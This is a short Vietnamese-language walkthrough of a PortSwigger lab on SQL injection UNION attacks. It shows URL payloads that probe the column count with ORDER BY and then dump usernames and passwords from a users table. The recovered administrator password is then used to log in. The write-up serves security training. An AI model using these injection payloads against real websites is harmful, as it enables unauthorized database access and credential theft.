# Lab: SQL injection UNION attack, retrieving data from other tables

### Link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
![Require of Lab](/Images/sql5.1.png)

Yêu cầu của bài lab là sử dụng kiểu tấn công SQL UINON để lấy toàn bộ username và password, sau đó sử dụng thông tin của user `administrator` để đăng nhập 

Truy cập vào bài lab ta thấy đây là 1 website bán hàng, với từng danh mục như `Corporate gifts`, `Food & Drink`, `Gifts` và `Lifestyle`, `Pets`....
![Website](/Images/sql5.2.png)

Tương tự như các bài lab trước về kỹ thuật tấn công này, đầu tiên ta phải xác định số cột được trả về bằng cách thay đổi URL bằng cách thêm vào chuỗi `'+ORDER+BY+2--`

> https://ace61f0c1ee40448c0a9142e007d0036.web-security-academy.net/filter?category=Pets%27+ORDER+BY+2--

![Product of Pets order by 2](/Images/sql5.4.png)

Tiếp tục thay đổi URL bằng chuỗi `'+ORDER+BY+3--` và nhận được thông báo lỗi, từ đó xác định số cột được trả về là 2.
> https://ace61f0c1ee40448c0a9142e007d0036.web-security-academy.net/filter?category=Pets%27+ORDER+BY+3--

![Product of Pets order by 3](/Images/sql5.5.png)

Sử dụng kỹ thuật UNION để lấy tất cả thông tin của những user trong bảng users như sau
> https://ace61f0c1ee40448c0a9142e007d0036.web-security-academy.net/filter?category=Pets%27+UNION+SELECT+username,password+FROM+users--

![Info of users](/Images/sql5.6.png)
Ta có thể thấy toàn bộ thông tin của user được hiển thị trên màn hình và thấy thông tin của user `administrator` có password là `1ponyx0xb5w0cyqq44r5`

Thực hiện đăng nhập bằng cách sử dụng thông tin của user `administrator`
![Login](/Images/sql5.7.png)

Tadaaaa, hoàn thành rồi nè
![Result](/Images/sql5.8.png)



<div align="right"> <i> Ngày 21 tháng 01 năm 2021 </i> </div>
